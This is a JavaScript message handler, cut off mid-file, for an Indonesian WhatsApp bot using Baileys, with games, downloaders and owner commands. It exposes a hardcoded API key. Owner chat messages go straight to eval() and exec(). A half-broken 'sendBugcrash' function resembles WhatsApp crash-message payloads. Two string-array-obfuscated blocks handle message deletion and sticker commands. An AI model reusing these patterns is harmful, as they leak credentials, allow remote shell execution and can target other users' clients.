"use strict";

require('./config')
process.on('uncaughtException', console.error)

//Module
const {
    default: makeWASocket,
    WASocket,
    AuthenticationState,
    WAMessage,
    Contact,
    areJidsSameUser,
    SocketConfig,
    DisconnectReason,
    BaileysEventMap,
    GroupMetadata,
    AnyMessageContent,
    MessageType,
    MiscMessageGenerationOptions,
    BufferJSON,
    delay,
    proto,
    useSingleFileAuthState,
    downloadContentFromMessage,
    WAMessageStubType,
    generateWAMessage,
    generateWAMessageFromContent
} = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const {
    fromBuffer
} = require('file-type')
const path = require('path')
const PhoneNumber = require('awesome-phonenumber')
const moment = require("moment-timezone");
const {
    exec,
    spawn
} = require("child_process");
const axios = require('axios')
const speed = require('performance-now')
const os = require('os')
const {
    performance
} = require('perf_hooks')
const ffmpeg = require('fluent-ffmpeg')
const yts = require('yt-search')
const ameClient = require("amethyste-api")
const ameApi = new ameClient('b29a4b5bd74782c8a7b4f53edb80211ffb7244650d1287c464190f1be4455bd5e042e5bae80fd88a27d4c2c5a4af7069164b714f6ff684d6bcbd3ebafcf27a5f')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const api = require('hikki-me')
const api1 = require('@bochilteam/scraper')
const api2 = require('xfarr-api')
const api3 = require('dhn-api')
const fetch = require('node-fetch')
const maker = require('mumaker')

//Library
const {
    color,
    bgcolor
} = require("../lib/color");
const { igStalk, 
             igDownload 
} = require("../lib/igdown");
const { ulartangga } = require('../game/ulartangga')
const sesiGame = './storage_cabinets/D-B/ulartangga/'
const {
    smsg,
    formatp,
    getBuffer,
    fetchJson,
    fetchText,
    getRandom,
    getGroupAdmins,
    runtime,
    sleep,
    tanggal,
    clockString
} = require("../lib/myfunc");
const { ytMp4, ytMp3, ytPlay } = require('../lib/yotube')
const skrep = require('../lib/scrape')
const {
    yta,
    ytv,
    upload
} = require("../lib/ytdl");
const {
    UploadFileUgu,
    webp2mp4File,
    TelegraPh
} = require('../lib/uploader')
const {
    addPlayGame,
    getJawabanGame,
    isPlayGame,
    cekWaktuGame,
    getGamePosi
} = require("../lib/games");
const games = require('../lib/game');

//----> Setting        
const setting = JSON.parse(fs.readFileSync('./config.json'));
const {
    ownerNumber,
    numberOwner,
    botName
} = setting

//----> Limit & Balance
const {
    isLimit,
    limitAdd,
    getLimit,
    giveLimit,
    addBalance,
    kurangBalance,
    getBalance,
    isGame,
    gameAdd,
    givegame,
    cekGLimit
} = require("../lib/limit");
const _prem = require("../lib/premium");
const msgFilter = require('../lib/msgFilter')
const tebakgambar = []

//----> Database 
let listmenu = JSON.parse(fs.readFileSync('./lib/listmenu.json'))
let premium = JSON.parse(fs.readFileSync('./data_load/premium.json'));
let balance = JSON.parse(fs.readFileSync('./data_load/balance.json'));
let limit = JSON.parse(fs.readFileSync('./data_load/limit.json'));
let glimit = JSON.parse(fs.readFileSync('./data_load/glimit.json'));

moment.tz.setDefault("Asia/Jakarta").locale("id");
 let sekarang = new Date();
let kemudian = new Date(2023, 14, 4);
let durasi = kemudian.getTime() - sekarang.getTime();

let detik = Math.floor(durasi / 1000);
let menit = Math.floor(detik / 60);
let jam   = Math.floor(menit / 60);
let hari  = Math.floor(jam / 24);

detik %= 60;
menit %= 60;
jam   %= 24;

let Birthday = `Hitung mundur 
     ulang tahun developer: 
	${hari} hari, 
	${jam} jam, 
	${menit} menit, 
	${detik} detik.`;
module.exports = async (bob, msg, m, M, help, setting) => {
    let {
        mentioned
    } = msg
    try {
        let {
            limitCount,
            gamewaktu
        } = setting
        let timeout = 60000
        const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('DD/MM/YY HH:mm:ss z')
        const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
        const from = msg.key.remoteJid
        const content = JSON.stringify(msg.message)

        const chats = (M.mtype === 'conversation' && msg.message.conversation) ? msg.message.conversation : (M.mtype == 'imageMessage') ? msg.message.imageMessage.caption : (msg.mtype == 'videoMessage') ? msg.message.videoMessage.caption : (msg.mtype == 'extendedTextMessage') ? msg.message.extendedTextMessage.text : (msg.mtype == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : (msg.mtype == 'listResponseMessage') ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : (msg.mtype == 'templateButtonReplyMessage') ? msg.message.templateButtonReplyMessage.selectedId : (msg.mtype === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId || msg.text) : ''

        if (bob.multi) {
            var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
        } else {
            if (bob.nopref) {
                prefix = ''
            } else {
                prefix = bob.prefa
            }
        }

        const command = chats.toLowerCase().split(' ')[0] || ''
        const args = chats.trim().split(/ +/).slice(1)
        const isGroup = msg.key.remoteJid.endsWith('@g.us')
        const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
        const pushname = msg.pushName || "No Name"
        const isCmd = command.startsWith(prefix)
        const run = process.uptime()
        const q = args.join(" ")
        const body = chats.startsWith(prefix) ? chats : ''
        var budy = (typeof M.text == 'string' ? M.text : '')
        const botNumber = bob.user.id.split(':')[0] + '@s.whatsapp.net'
        const groupMetadata = isGroup ? await bob.groupMetadata(from) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const groupId = isGroup ? groupMetadata.id : ''
        const groupMembers = isGroup ? groupMetadata.participants : ''
        const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
        const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
        const isGroupAdmins = groupAdmins.includes(sender) || false
        const isOwner = ownerNumber.includes(sender)
        const isNumber = x => typeof x === 'number' && !isNaN(x)
        const isUser = global.db.data.users[sender] || false
        const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)


        const gcounti = setting.gcount
        const gcount = isPremium ? gcounti.prem : gcounti.user



        //const mentionUser = [...new Set([...(m.mentionedJid || []), ...(M.quoted ? [M.quoted.sender] : [])])]

        const mentionByTag = M.mtype == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByreply = M.mtype == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByreply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []

        const isUrl = (uri) => {
            return uri.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const jsonformat = (json) => {
            return JSON.stringify(json, null, 2)
        }

        const antibot = M.isBaileys
        if (antibot === true) return
        const quoted = M.quoted ? M.quoted : M
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
         
         const chatmessage = (msg.mtype === 'conversation' && msg.message.conversation) ? msg.message.conversation : (msg.mtype == 'imageMessage') ? msg.message.imageMessage.caption : (msg.mtype == 'videoMessage') ? msg.message.videoMessage.caption : (msg.mtype == 'extendedTextMessage') ? msg.message.extendedTextMessage.text : (msg.mtype == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : (msg.mtype == 'listResponseMessage') ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : (msg.mtype == 'templateButtonReplyMessage') ? msg.message.templateButtonReplyMessage.selectedId : (msg.mtype === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId || msg.text) : ''
        const isWebp = (M.mtype === 'imageMessage' || M.mtype === 'videoMessage')
        const isImage = (M.mtype == 'imageMessage')
        const isVideo = (M.mtype == 'videoMessage')
        const isSticker = (M.mtype == 'stickerMessage')
        const isQuotedMsg = (M.mtype == 'extendedTextMessage')
        const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
        const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
        const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
        const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
        const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const isQuotedTag = isQuotedMsg ? content.includes('mentionedJid') ? true : false : false
        const isQuotedReply = isQuotedMsg ? content.includes('Message') ? true : false : false


        // Premium
        _prem.expiredCheck(bob, premium)

        if (setting.Mode === 'Self') {
            if (!isOwner) return
        }

        function parseMention(text) {
            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
        }

        function random(arr) {
            return arr[Math.floor(Math.random() * arr.length)]
        }

        function randomNomor(min, max = null) {
            if (max !== null) {
                min = Math.ceil(min);
                max = Math.floor(max);
                return Math.floor(Math.random() * (max - min + 1)) + min;
            } else {
                return Math.floor(Math.random() * min) + 1
            }
        }


        // DATABASE
        try {
            let users = global.db.data.users[M.sender]
            if (typeof users !== 'object') global.db.data.users[M.sender] = {}
            if (users) {
                if (!isNumber(users.afkTime)) users.afkTime = -1
                if (!('banned' in users)) users.banned = false
                if (!('afkReason' in users)) users.afkReason = ''
            } else global.db.data.users[M.sender] = {
                afkTime: -1,
                banned: false,
                afkReason: '',
            }
            
            

            let chats = global.db.data.chats[M.chat]
            if (typeof chats !== 'object') global.db.data.chats[M.chat] = {}
            if (chats) {
                if (!('setWelcome' in chats)) chats.setWelcome = ''
                if (!('setLeave' in chats)) chats.setLeave = ''
            } else global.db.data.chats[M.chat] = {
                setWelcome: '',
                setLeave: '',
            }
        
            let settings = global.db.data.settings[botNumber]
            if (typeof settings !== 'object') global.db.data.settings[botNumber] = {}
            if (settings) {
                if (!('available' in settings)) settings.available = false
                if (!('composing' in settings)) settings.composing = false
                if (!('recording' in settings)) settings.recording = false
            } else global.db.data.settings[botNumber] = {
                available: false,
                composing: false,
                recording: false,
            }
        } catch (err) {
            console.log(err)
        }


        // STATUS BOT
        const used = process.memoryUsage()
        const cpus = os.cpus().map(cpu => {

            cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
            return cpu
        })
        const cpu = cpus.reduce((last, cpu, _, {
            length
        }) => {
            last.total += cpu.total
            last.speed += cpu.speed / length
            last.times.user += cpu.times.user
            last.times.nice += cpu.times.nice
            last.times.sys += cpu.times.sys
            last.times.idle += cpu.times.idle
            last.times.irq += cpu.times.irq
            return last
        }, {
            speed: 0,
            total: 0,
            times: {
                user: 0,
                nice: 0,
                sys: 0,
                idle: 0,
                irq: 0
            }
        })
        const reply = (teks, men) => {
            return bob.sendMessage(from, {
                text: teks,
                mentions: men ? men : []
            }, {
                quoted: msg
            })
        }

        const replyNtag = (teks) => {
            bob.sendMessage(from, {
                text: teks,
                mentions: parseMention(teks)
            }, {
                quoted: msg
            })
        }

        const textImg = (teks, buffer = fs.readFileSync(global.pathImg), mess, men) => {
            return bob.sendMessage(from, {
                text: teks,
                jpegThumbnail: buffer,
                mention: men ? men : []
            }, {
                quoted: mess ? mess : msg
            })
        }

        const sendMess = (from, teks) => {
            return bob.sendMessage(from, {
                text: teks
            })
        }

        const sendRespon = (respon) => {
            return bob.sendMessage(from, {
                sticker: fs.readFileSync(`./media/sticker/${respon}.webp`)
            }, {
                quoted: msg
            })
        }

        const sendLimit = () => {
            return bob.sendMessage(from, {
                sticker: fs.readFileSync('./media/sticker/limit.webp')
            }, {
                quoted: msg
            })
        }


        const fake = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: "6283102650464-1589321480@g.us"
                } : {})
            },
            message: {
                "extendedTextMessage": {
                    "text": `*Hallo* _${pushname} 👋_\n	╰≻ ${command}`,
                    "title": `Hmm`,
                    'jpegThumbnail': global.pathImg
                }
            }
        }

        const nay1 = {
            key: {
                fromMe: false,
                participant: "0@s.whatsapp.net",
                ...(from ? {
                    remoteJid: "status@broadcast"
                } : {})
            },
            message: {
                contactMessage: {
                    displayName: `Selamat ${salam}\n☏User: ${pushname}`,
                    vcard: 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + `item1.TEL;waid=${sender.split("@")[0]}:+${sender.split("@")[0]}\n` + 'item1.X-ABLabel:Ponsel\n' + 'END:VCARD'
                }
            }
        }


        const sendFile = async (from, url, caption, msg, men) => {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            if (mime.split("/")[1] === "gif") {
                return bob.sendMessage(from, {
                    video: await convertGif(url),
                    caption: caption,
                    gifPlayback: true,
                    mentions: men ? men : []
                }, {
                    quoted: msg
                })
            }
            let type = mime.split("/")[0] + "Message"
            if (mime.split("/")[0] === "image") {
                return bob.sendMessage(from, {
                    image: await getBuffer(url),
                    caption: caption,
                    mentions: men ? men : []
                }, {
                    quoted: msg
                })
            } else if (mime.split("/")[0] === "video") {
                return bob.sendMessage(from, {
                    video: await getBuffer(url),
                    caption: caption,
                    mentions: men ? men : []
                }, {
                    quoted: msg
                })
            } else if (mime.split("/")[0] === "audio") {
                return bob.sendMessage(from, {
                    audio: await getBuffer(url),
                    caption: caption,
                    mentions: men ? men : [],
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: msg
                })
            } else {
                return bob.sendMessage(from, {
                    document: await getBuffer(url),
                    mimetype: mime,
                    fileName: caption,
                    mentions: men ? men : []
                }, {
                    quoted: msg
                })
            }
        }

        //bob.sendReadReceipt(from, sender, [msg.key.id])

        bob.typeMediaUrl = async (url) => {
            let memek = '';
            let mekres = await axios.head(url)
            memek = mekres.headers['content-type']
            console.log(memek)
            if (memek.split("/")[1] === "gif") {
                return `video`
            }
            if (memek === "application/pdf") {
                return `document`
            }
            if (memek.split("/")[0] === "image") {
                return `image`
            }
            if (memek.split("/")[0] === "video") {
                return `video`
            }
            if (memek.split("/")[0] === "audio") {
                return `audio`
            }
        }

        const bobSend = async (from, url, msg) => {
            await bob.typeMediaUrl(url).then((res) => {
                msg.reply('Sending.....')
                getBuffer(url).then(buffer => bob.sendMessage(from, {
                    [res]: buffer
                }, {
                    quoted: msg
                }))
            })
        }

        bob.createMessage = async (jidnya, kontennya, optionnya) => {
            return await generateWAMessage(jidnya, kontennya, {
                ...optionnya,
                userJid: bob.authState.creds.me.id,
                upload: bob.waUploadToServer
            })
        }
        
        const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return bob.relayMessage(msg.key.remoteJid, msg.message, {
messageId: ""
})
}
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(M.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `Aprilia x Lynn : ${runtime(process.uptime())}`,jpegThumbnail: fs.readFileSync('./media/boby.jpg')}}}

        if (isCmd && msgFilter.isFiltered(M.chat) && !isGroup) {
            console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
            return reply('「 ❗ 」Sabar Bang 5 Detik/Command')
        }

        if (isCmd) {
            var culur = ['lime', 'aqua', 'yellow', 'magenta']
            var rundum = culur[Math.floor(Math.random() * culur.length)]
            addBalance(sender, 20, balance)
            console.log(color(`「 ❗ 」Command ${command} from ${pushname} in ${M.isGroup ? groupName : 'Private Chat'}`, rundum))
        }

        /*if (M.message) {
        addBalance(sender, 5, balance)
        console.log(chalk.black(chalk.magentaBright('[ PESAN ]')), chalk.black(chalk.greenBright(new Date)), chalk.black('\n' + chalk.whiteBright('=> Command ' + chats || M.mtype)) + '\n' + chalk.greenBright('=> Dari'), chalk.black(chalk.redBright(pushname)), chalk.yellowBright(M.sender) + '\n' + chalk.greenBright('=> Di'), chalk.black(chalk.cyanBright(M.isGroup ? groupName : 'Private Chat', M.chat)))
        }*/

        if (isCmd && !isOwner) msgFilter.addFilter(from)

        if (isOwner) {
            if (chats.startsWith("> ")) {
                console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`From Owner`))
                try {
                    let evaled = await eval(chats.slice(2))
                    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                    reply(`${evaled}`)
                } catch (err) {
                    console.log(color('[❗]', 'red'))
                    reply(`${err}`)
                }
            } else if (chats.startsWith("$ ")) {
                console.log(color('[EXEC]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`From Owner`))
                exec(chats.slice(2), (err, stdout) => {
                    if (err) return reply(`${err}`)
                    if (stdout) reply(`${stdout}`)
                })
            }
        }


        //GAME
        cekWaktuGame(bob, tebakgambar)
        if (isPlayGame(from, tebakgambar) && isUser) {
            if (chats.toLowerCase() == getJawabanGame(from, tebakgambar)) {
                var htgm = randomNomor(50, 100)
                addBalance(sender, htgm, balance)
                reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebakgambar)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *tebakgambar*`)
                tebakgambar.splice(getGamePosi(from, tebakgambar), 1)
            } else {
                reply('salah')
            }
        }

/**************** DELET SESI ULARTANGGA ***************/
var _0x37e047=_0x244f;(function(_0x28e21f,_0x3ae571){var _0x3f2d58=_0x244f,_0x3b1b94=_0x28e21f();while(!![]){try{var _0x5b71d6=parseInt(_0x3f2d58(0x94))/0x1+-parseInt(_0x3f2d58(0x9d))/0x2*(-parseInt(_0x3f2d58(0x9b))/0x3)+parseInt(_0x3f2d58(0x93))/0x4+parseInt(_0x3f2d58(0x9a))/0x5*(parseInt(_0x3f2d58(0x99))/0x6)+parseInt(_0x3f2d58(0x92))/0x7+-parseInt(_0x3f2d58(0x97))/0x8+-parseInt(_0x3f2d58(0x95))/0x9;if(_0x5b71d6===_0x3ae571)break;else _0x3b1b94['push'](_0x3b1b94['shift']());}catch(_0x636296){_0x3b1b94['push'](_0x3b1b94['shift']());}}}(_0x323f,0x7f27b),bob[_0x37e047(0x98)]=async(_0x5f465b,_0x2a8690)=>{var _0x2fc6db=_0x37e047,_0x3aaf7a=_0x5f465b[_0x2fc6db(0x9c)],_0xa9efa4=0x0;async function _0xc179d(){var _0x51408e=_0x2fc6db;if(_0x3aaf7a==_0xa9efa4)return;await sleep(0x3e8),bob[_0x51408e(0x96)](from,{'delete':{'remoteJid':from,'fromMe':!![],'id':_0x5f465b[_0xa9efa4],'participant':_0x2a8690}}),_0xa9efa4+=0x1,_0xc179d();}_0xc179d();},bob['Delete']=async(_0x53d6b7,_0x259bc9)=>{var _0x130eff=_0x37e047;await bob[_0x130eff(0x96)](from,{'delete':{'remoteJid':from,'fromMe':!![],'id':_0x53d6b7,'participant':_0x259bc9}});});function _0x244f(_0x4ab264,_0x39162e){var _0x323f44=_0x323f();return _0x244f=function(_0x244fe5,_0x59c567){_0x244fe5=_0x244fe5-0x92;var _0x8b560a=_0x323f44[_0x244fe5];return _0x8b560a;},_0x244f(_0x4ab264,_0x39162e);}function _0x323f(){var _0x14dba1=['sendMessage','4642448Ewzfwh','DeleteMessage','516SFGisb','8660diUYlc','3oiGuRY','length','1563914ptkPxR','858263ebdJnW','2121820Gvqsab','455540JUamIg','8445420lGRuiB'];_0x323f=function(){return _0x14dba1;};return _0x323f();}
       
       ulartangga(from, msg, bob, chatmessage)
       
 // BANNED
        if (db.data.users[M.sender].banned && isCmd) {
            await replyNtag(`Maaf @${M.sender.split("@")[0]} Anda Telah Dibanned, Chat Owner Untuk Un Banned`)
            return
        }

        // Afk
        try {
            for (let jid of mentionUser) {
                let user = global.db.data.users[jid]
                if (!user) continue
                let afkTime = user.afkTime
                if (!afkTime || afkTime < 0) continue
                let reason = user.afkReason || ''
                reply(`
Jangan tag dia!
Dia sedang    ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
            }

            if (db.data.users[M.sender].afkTime > -1) {
                let user = global.db.data.users[M.sender]
                reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
                user.afkTime = -1
                user.afkReason = ''

            }
        } catch {}

        function _0x3725() {
            const _0x489e76 = ['quoted', 'toString', 'isGroup', 'emit', 'fileSha256', 'WebMessageInfo', '541817vcekjD', '12JuXTbL', 'fromObject', '1026636ZmyoVn', 'data', 'pushName', '10emQIEr', 'user', 'sender', 'key', 'fakeObj', 'msg', '2021440ShtdnP', 'fromMe', '5881162CdVdlY', 'append', '197220iwUwKO', '1497618DdogdV', 'chat', 'participant', '10wOXdTy', 'messages.upsert', '4303512zZyIRo', 'base64', 'cmd'];
            _0x3725 = function() {
                return _0x489e76;
            };
            return _0x3725();
        }

        function _0x476b(_0x51cf4e, _0x5dfa94) {
            const _0x3725b0 = _0x3725();
            return _0x476b = function(_0x476bb1, _0x3c4c33) {
                _0x476bb1 = _0x476bb1 - 0xbc;
                let _0x55a5ae = _0x3725b0[_0x476bb1];
                return _0x55a5ae;
            }, _0x476b(_0x51cf4e, _0x5dfa94);
        }
        const _0xa50f35 = _0x476b;
        (function(_0x48760b, _0x4fd5d9) {
            const _0x4214be = _0x476b,
                _0x394911 = _0x48760b();
            while (!![]) {
                try {
                    const _0x4149ad = parseInt(_0x4214be(0xcf)) / 0x1 + parseInt(_0x4214be(0xc4)) / 0x2 * (-parseInt(_0x4214be(0xc0)) / 0x3) + parseInt(_0x4214be(0xd2)) / 0x4 + parseInt(_0x4214be(0xbc)) / 0x5 * (parseInt(_0x4214be(0xd0)) / 0x6) + -parseInt(_0x4214be(0xbe)) / 0x7 + parseInt(_0x4214be(0xc6)) / 0x8 + -parseInt(_0x4214be(0xc1)) / 0x9 * (parseInt(_0x4214be(0xd5)) / 0xa);
                    if (_0x4149ad === _0x4fd5d9) break;
                    else _0x394911['push'](_0x394911['shift']());
                } catch (_0x33abc4) {
                    _0x394911['push'](_0x394911['shift']());
                }
            }
        }(_0x3725, 0xc5afb));
        if (isMedia && M[_0xa50f35(0xda)][_0xa50f35(0xcd)] && M[_0xa50f35(0xda)][_0xa50f35(0xcd)]['toString'](_0xa50f35(0xc7)) in global['db'][_0xa50f35(0xd3)][_0xa50f35(0xc8)]) {
            let hash = global['db'][_0xa50f35(0xd3)]['cmd'][M['msg'][_0xa50f35(0xcd)][_0xa50f35(0xca)](_0xa50f35(0xc7))],
                {
                    q,
                    mentionedJid
                } = hash,
                messages = await generateWAMessage(M[_0xa50f35(0xc2)], {
                    'text': q,
                    'mentions': mentionedJid
                }, {
                    'userJid': bob[_0xa50f35(0xd6)]['id'],
                    'quoted': M['quoted'] && M[_0xa50f35(0xc9)][_0xa50f35(0xd9)]
                });
            messages[_0xa50f35(0xd8)][_0xa50f35(0xbd)] = areJidsSameUser(M[_0xa50f35(0xd7)], bob[_0xa50f35(0xd6)]['id']), messages[_0xa50f35(0xd8)]['id'] = M[_0xa50f35(0xd8)]['id'], messages[_0xa50f35(0xd4)] = M[_0xa50f35(0xd4)];
            if (M[_0xa50f35(0xcb)]) messages[_0xa50f35(0xc3)] = M['sender'];
            let msg1 = {
                ...msg,
                'messages': [proto[_0xa50f35(0xce)][_0xa50f35(0xd1)](messages)],
                'type': _0xa50f35(0xbf)
            };
            bob['ev'][_0xa50f35(0xcc)](_0xa50f35(0xc5), msg1);
        }

        // COMMAND
        switch (command) {

            case prefix + 'tebakgambar':
                if (isGame(sender, isOwner, gcount, glimit)) return sendRespon('limit')
                if (isGroup) return reply('Permainan hanya bsia di lakukan di private chat')
                reply('memulai permainan')
                if (isPlayGame(from, tebakgambar)) return bob.reply(from, `Masih ada game yang belum diselesaikan`, tebakgambar[getGamePosi(from, tebakgambar)].msg)
                games.tebakgambar().then(data => {
                    data = data[0]
                    data.jawaban = data.jawaban.split('Jawaban ').join('')
                    var teks = `*TEBAK GAMBAR*\n\nPetunjuk : ${data.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`
                    bob.sendMessage(from, {
                            image: {
                                url: data.image
                            },
                            caption: teks
                        }, {
                            quoted: msg
                        })
                        .then(res => {
                            var jawab = data.jawaban.toLowerCase()
                            addPlayGame(from, 'Tebak Gambar', jawab, gamewaktu, res, tebakgambar)
                            gameAdd(sender, glimit)
                        })
                })
                break


case prefix + 'setppbot2': {
if (!isOwner) return reply(mess.owner)
if (!quoted) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
let mediaa = await bob.downloadAndSaveMediaMessage(quoted)
var { img } = await pepe(mediaa)
await bob.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
 }
 ]
 })
reply(`Sukses`)
 }
break

            case prefix + 'kodekeras': {
                if (!q) return reply('mau versi cwe apa cwo?')
                var typex = q
                reply('Sayang bisa jalan gk?')
                await sleep(3000)
                const sections = [{
                        title: "Pilihan 1 Terima",
                        rows: [{
                            title: "Ayo sayang",
                            rowId: `#jawab terima`
                        }]
                    },
                    {
                        title: "Pilihan 2 Tolak",
                        rows: [{
                                title: "Gak ah males",
                                rowId: `#jawab tolak`
                            }
                            //{title: "Option 4", rowId: "option4", description: "This is a description V2"}
                        ]
                    },
                ]

                const listMessage = {
                    text: "Pilih jawaban ",
                    footer: "Beta version kodekeras",
                    title: "-",
                    buttonText: "-",
                    sections
                }
                const sendMsg = await bob.sendMessage(M.chat, listMessage)
            }
            break

            case prefix + 'jawab':
                if (!q) return console.log('kok kosong?')
                var jwb = q
                if (jwb == 'terima') {
                    bob.sendMessage(M.chat, {
                        text: 'Mau jalan ke mana ayang👀😘'
                    })
                } else if (jwb == 'tolak') {
                    bob.sendMessage(M.chat, {
                        text: 'Kok kamu gtu sih😠'
                    })
                }
                break

            case prefix + 'setcmd': {
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                global.db.data.cmd = global.db.data.cmd || {}
                if (!M.quoted) return reply(`Reply stiker!!\nExample : ${command} menu\n\n\n*Note : Tidak dapat disertai Prefix!!*`)
                if (!M.quoted.fileSha256) return reply('SHA256 Hash Missing')
                if (!q) return reply(`Untuk Command Apa?`)
                let sticker = global.db.data.cmd
                let hash = M.quoted.fileSha256.toString('base64')
                if (sticker[hash] && sticker[hash].locked) return reply('You have no permission to change this sticker command')
                sticker[hash] = {
                    q,
                    mentionedJid: M.mentionedJid,
                    creator: M.sender,
                    at: +new Date,
                    locked: false,
                }
                reply(`Done!`)
                limitAdd(sender, limit)
            }
            break

case prefix + 'ssweb': case prefix + 'ss': 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit() (`*[ LIMIT KAMU HABIS ]*\nBeli limit di buylimit atau beli premium untuk mendapatkan unlimited limit`) 
              if (!q) return msg.reply('Harap sertakan link!')
                bob.sendMessage(from, { react: { text: "⏱️", key: msg.key }})
               bob.sendMessage(from, { image: { url : 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + q }, caption: `Result✔️`}, { quoted: nay1 } )
               limitAdd(sender, limit)
         break;
         case prefix + 'toanime':
            case prefix + 'jadianime':
                let toAnime = require('../plugins/jadianime')
                toAnime(M, mime, msg, quoted, bob)
                break

case prefix + 'ametes':
ameApi.generate("glitch", {
    "url" : "https://cdn.discordapp.com/avatars/450352584302002186/c0ff7e943ab89560503b8e99591ff888.png?size=2048"
}).then(image => {
    console.log(image)
}).catch(err => {
    throw err;
})
break

            case prefix + 'delcmd': {
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let hash = M.quoted.fileSha256.toString('base64')
                if (!hash) return reply(`Tidak ada hash`)
                let sticker = global.db.data.cmd
                if (sticker[hash] && sticker[hash].locked) return reply('You have no permission to delete this sticker command')
                delete sticker[hash]
                reply(`Done!`)
            }
            break

            case prefix + 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked

*Hash :*
 ${Object.entries(global.db.data.cmd).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} 
*Command: ${value.q}*
*Creator : @${value.creator.split("@")[0]}*
*Create Time : ${clockString(new Date - value.at)} ago*
*Locked : ${value.locked}*

`).join('\n')}
`.trim()
                replyNtag(teks)
                limitAdd(sender, limit)
            }
            break

case prefix + 'twitterdl': case prefix + 'twitdl': {
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
if (!q) return reply( `Example : ${command} link`)
